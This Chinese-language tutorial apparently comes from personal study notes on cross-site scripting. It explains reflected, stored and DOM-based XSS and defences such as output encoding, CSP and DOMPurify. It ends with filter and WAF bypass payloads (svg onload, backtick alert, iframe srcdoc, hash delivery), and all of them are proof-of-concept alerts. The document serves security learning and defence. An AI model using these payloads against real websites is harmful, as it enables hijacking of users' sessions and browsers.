# XSS 跨站脚本攻击

<font style="color:rgb(0,0,0);">XSS全称（跨站脚本攻击），是将恶意 </font><font style="color:rgb(255,53,2);">JavaScript </font><font style="color:rgb(0,0,0);">代码插入到Web页面中，当用户浏览到该页面时这些嵌入在Web页面的代码就会被执行，从而到达攻击者的攻击目的。</font>

![image-20260718152809340](https://exllo-lv-github-notes-picture-1452130078.cos.ap-nanjing.myqcloud.com/img/image-20260718152809340.png)

## 漏洞产生原理

形成XSS漏洞主要原因是：因为Web应用程序对**用户输入的内容**和**程序输出的内容**没有经过严格的校验和过滤，导致攻击者构造恶意的代码带入后，又被当作正常的代码输出至前端页面，浏览器当作有效代码解析执行从而产生危害。



## 漏洞危害

1. 窃取用户 Cookie 信息
2. 网络钓鱼，包括获取各类用户浏览器账号
3. 劫持用户浏览器，从而执行任意操作
4. 网页挂马（网页的篡改）
5. 配合其他漏洞使用，如（CSRF）实施进一步危害
6. 传播跨站脚本蠕虫等



## 漏洞分类

反射型,存储型,DOM型



### 反射型XSS

**定义:**反射型XSS又称非持久性XSS、参数型XSS。反射型XSS的恶意代码在Web应用的参数中,需要诱骗受害者点击访问含有恶意代码的链接，从而触发XSS攻击。

**特点:**一次性攻击

**攻击方式:**欺骗用户自己去点击含有XSS的链接

攻击者通过发送邮件或诱导等方式，将包含有恶意XSS代码的链接发送给目标用户，当目标用户访问该链接时，服务器接收用户的请求并进行处理，然后服务器把带有XSS恶意脚本的代码发送给目标用户浏览器，浏览器解析恶意代码，触发XSS攻击。

**攻击过程:**

![image-20260718154655485](https://exllo-lv-github-notes-picture-1452130078.cos.ap-nanjing.myqcloud.com/img/image-20260718154655485.png)

<font style="color:rgb(0,0,0);">反射性XSS，属于交互触发的漏洞，需要用户主动点击才能触发，所以需要攻击者主动将包含恶意代码的URL发送给用户。步骤如下：</font>

1. 构造恶意代码的链接
2. 通过某种方式发送给受害者。
3. 受害者打开页面，向服务器发送请求。
4. 服务器解析地址，然后返回源代码。 
5. 浏览器接收，解析代码触发XSS漏洞攻击。 





### 存储型XSS

攻击者将恶意脚本永久存储在**目标服务器**,当其他用户访问包含该数据的页面,恶意代码被从服务器取出并执行。

![image-20260720101516799](https://exllo-lv-github-notes-picture-1452130078.cos.ap-nanjing.myqcloud.com/img/image-20260720101516799.png)

**常见的位置**

| 存储位置         | 典型场景                                     | 触发条件               |
| ---------------- | -------------------------------------------- | ---------------------- |
| **数据库**       | 评论区、留言板、帖子内容、用户资料、商品评价 | 任何人查看时触发       |
| **文件系统**     | 日志文件、上传的文件名、配置文件             | 管理员查看日志时触发   |
| **缓存系统**     | Redis/Memcached缓存页面                      | 缓存命中时触发         |
| **Session/会话** | 存储用户偏好、购物车数据                     | 用户访问相关页面时触发 |
| **NoSQL数据库**  | MongoDB、Elasticsearch中的用户输入           | 查询结果显示时触发     |

#### 防御方式

1. **输入过滤(白名单)**

```php
$comment = strip_tags($_POST['comment'], '<p><br><strong><em>');
```

仅允许`<p>,<br>,<strong>,<em>`等标签

2. **输出编码**

```php
// HTML属性值
    public static function attr($data) {
        return htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    }
    
    // JavaScript字符串
    public static function js($data) {
        return json_encode($data);
    }
    
    // URL
    public static function url($data) {
        return urlencode($data);
    }
```

3. **使用成熟的防XSS库**
4. **CSP**内容安全策略

```http
Content-Security-Policy: 
    default-src 'self';
    script-src 'self' https://cdn.example.com;
    object-src 'none';
    base-uri 'self';
```

- `'self'`：当前域名同源脚本
- `https://xxx.com`：允许指定域名
- `'unsafe-inline'`：放行行内 `<script>`、`onclick`、`javascript:` 伪协议
- `unsafe-eval`: ` 放行 `eval()`、`new Function()`、`setTimeout("代码")
- `'nonce-随机串'`：仅放行带对应 nonce 的 script 标签（替代 unsafe-inline）
- `'sha256-xxx'`：放行指定哈希值的内联脚本



5. **HTTPOnly Secure Cookies**

```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict;
```



### DOM型XSS

DOM型XSS是最隐蔽的XSS类型，因为它**完全不经过服务器**，纯前端触发，WAF和服务器端日志都看不到攻击痕迹。

#### 什么是DOM型

DOM型XSS是指攻击者利用**前端JavaScript代码中不安全地操作DOM**，导致恶意代码在用户浏览器中执行。

![image-20260720103106758](https://exllo-lv-github-notes-picture-1452130078.cos.ap-nanjing.myqcloud.com/img/image-20260720103106758.png)

##### DOM

**DOM（Document Object Model，文档对象模型）** 是浏览器将HTML文档解析成的一个**树形结构**，它把网页的每个部分都变成一个**对象**，让JavaScript可以像操作一棵大树一样，**读取、修改、删除**网页的内容和样式。

简单说：DOM就是浏览器给JavaScript提供的操作网页的**接口**。

1. ###### document（文档根对象）

`document` 是DOM的**入口**，代表整个文档。

```javascript
// 常见操作
document.title = "新标题";
document.body.style.backgroundColor = "red";
document.getElementById("desc").textContent = "新文字";
```

2. 元素节点（Element）

代表HTML标签，如 `<div>`、`<p>`、`<img>`。

javascript

```javascript
// 获取元素
const div = document.querySelector('div');
const p = document.getElementById('myId');

// 操作元素
div.innerHTML = '<span>新内容</span>';      // 修改HTML内容
div.textContent = '纯文本内容';              // 修改纯文本
div.setAttribute('class', 'active');       // 修改属性
div.style.color = 'blue';                  // 修改样式
```

3. 文本节点（TextNode）

代表标签内的文字内容。

javascript

```javascript
// 创建文本节点
const text = document.createTextNode('Hello');
div.appendChild(text);
```

4. 属性节点（Attribute）

代表标签的属性，如 `class="test"`、`id="main"`。

javascript

```javascript
const id = div.getAttribute('id');
div.setAttribute('data-info', 'value');
```



#### DOM型的各种攻击方式

##### **URL型**

- 访问含漏洞的页面

  ```
  http://victim.com/search.html?q=<img src=x onerror=alert(1)>
  ```

- 服务器返回正常的HTML

  ```html
  <!DOCTYPE html>
  <html>
  <head>
      <title>搜索页面</title>
  </head>
  <body>
      <h1>搜索结果</h1>
      <div id="result"></div>
      <script src="app.js"></script>
  </body>
  </html>
  ```

- 浏览器解析HTML并加载执行 `app.js`

  ```javascript
  // app.js - 存在漏洞的代码
  window.onload = function() {
      // 从URL读取参数
      var query = location.search.split('=')[1];
      
      //直接将用户输入写入DOM
      document.getElementById('result').innerHTML = '您搜索了：' + query;
  };
  ```

-  js读取到之后写入DOM中

  ```js
  document.getElementById('result').innerHTML = '您搜索了：<img src=x onerror=alert(1)>';
  ```

  此时浏览器解析这段之后就会

  - 创建<img>标签

  - 设置 `src`然后加载失败

  - 触发 `onerror`事件

  - 执行 `alert(1)`出现弹窗

    

##### 常见的数据来源

1. **location对象**

```js
// 各种location属性都可以被攻击者控制
location.href      // 完整URL
location.search    // ? 后面的查询字符串
location.hash      // # 后面的片段标识符
location.pathname  // 路径部分
location.protocol  // 协议部分
location.host      // 主机名+端口
```

2. **document.referrer**

```js
// 读取用户从哪个页面跳转过来
var ref = document.referrer;  // http://attacker.com/?<script>alert(1)>
document.write('来自：' + ref);
```

3. **window.name**(跨页面数据)

```js
// window.name 在页面跳转后依然保留
var data = window.name;
document.write(data);
```

攻击者页面:

```html
攻击者页面
<script>
    window.name = '<img src=x onerror=alert(1)>';
    location.href = 'http://victim.com/page.html';
</script>
```



4. **postMessage**(跨域通信)

```js
// 接收跨域消息
window.addEventListener('message', function(e) {
    //未验证来源和数据
    document.getElementById('output').innerHTML = e.data;
});
```

攻击者页面:

```html
<iframe src="http://victim.com/page.html"></iframe>
<script>
    var iframe = document.querySelector('iframe');
    iframe.contentWindow.postMessage(
        '<img src=x onerror=alert(1)>',
        '*'
    );
</script>
```

5. **本地存储**

```js
// 从localStorage读取数据
var data = localStorage.getItem('userData');
document.write(data);
```

#### 防御原理方式

1. **使用安全的Sink汇**

```js
//危险
element.innerHTML = userInput;

// 安全（纯文本）
element.textContent = userInput;
element.innerText = userInput;

//安全（创建文本节点）
const text = document.createTextNode(userInput);
element.appendChild(text);
```

2. **净化后再写入**

```js
// 使用 DOMPurify
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(userInput, {
    ALLOWED_TAGS: ['b', 'i', 'u', 'p'],
    ALLOWED_ATTR: ['class']
});

element.innerHTML = clean;  // 安全
```

3. **CSP限制**

```http
Content-Security-Policy: 
    default-src 'self';
    script-src 'self';
    object-src 'none';
    base-uri 'self';
```

4. **输入验证**

```js
// 白名单验证
function isValidName(name) {
    return /^[a-zA-Z\u4e00-\u9fa5]{2,10}$/.test(name);
}

const name = location.hash.substring(1);
if (isValidName(name)) {
    document.getElementById('greeting').textContent = name;
}
```

## XSS防御绕过方式及思路**

XSS可能出现的位置

|    位置     |        示例        |
| :---------: | :----------------: |
|   搜索框    |    `?q=keyword`    |
| 评论 / 留言 |     文本框提交     |
|  用户资料   | 昵称 / 签名 / 地址 |
| 文件名上传  |    `test.jpg"`     |
|   URL跳转   | `?return_url=xxx`  |
|  文章内容   |    富文本编辑器    |
|  客服系统   |      消息内容      |
|  邮件模板   |    用户输入姓名    |
|  JSONP接口  |  `?callback=xxx`   |
|   错误页    |  `404: 用户输入`   |



**思路**:先确定注入点在HTML的哪一层

- **HTML标签内容**
- **HTML标签属性值**
- **JS字符串中**
- **URL参数值中**
- **CSS样式块**

> [!IMPORTANT]
>
> **判断方法**：输入一个唯一字符串如 `AAA'"><123`，然后查看页面源码，看它**出现在哪里**、哪些**字符被转义了**。

**步骤:**

1. 确定攻击目标

| 上下文      | 目标                                                       |
| :---------- | :--------------------------------------------------------- |
| HTML 内容   | 插入一个**可执行标签**（`<script>`、`<img>`）              |
| HTML 属性值 | **闭合属性**并插入事件（`" onerror=alert(1)`）             |
| JS 字符串   | **闭合引号**并结束语句（`';alert(1);//`）                  |
| URL         | 使用 `javascript:` 协议                                    |
| CSS         | 使用 `expression(...)`（旧 IE）或 `@import`引入远程恶意CSS |

1. 利用WAF和浏览器的解析差
2. 用最小Payload验证再升级

实战

场景 1：过滤了 `<script>` 和 `onerror`

html

```
<!-- 输入 -->
<ScRiPt>alert(1)</ScRiPt>        ❌ 被删
<img src=x onerror=alert(1)>      ❌ 被删
```



**绕过思路**：使用**其他标签 + 事件**

html

```
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
```



------

场景 2：过滤了 `alert`

html

```
prompt(1)
confirm(1)
console.log(1)
eval('alert(1)')
alert`1`
```



------

场景 3：过滤了括号 `(` 和 `)`

html

```
alert`1`
alert`${1}`
```



------

场景 4：过滤了引号

html

```
?name=<img src=x onerror=alert(1)>   <!-- 无引号 -->
?name=<img src=x onerror=`alert(1)`> <!-- 反引号 -->
```



------

场景 5：过滤了空格

html

```
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
```



------

场景 6：输出在 JS 字符串中，但 `'` 被转义

php

```
// 服务端做了 addslashes
echo "var name = '" . addslashes($_GET['name']) . "';";
```



**绕过**：使用 HTML 实体或 Unicode 闭合**当前标签上下文**

html

```
</script><img src=x onerror=alert(1)>
```



------

场景 7：WAF 检测 URL 中的 `?name=...`

html

```
# 使用 #（hash）绕过
http://victim.com/page.html#<img src=x onerror=alert(1)>
```



## 靶场实战

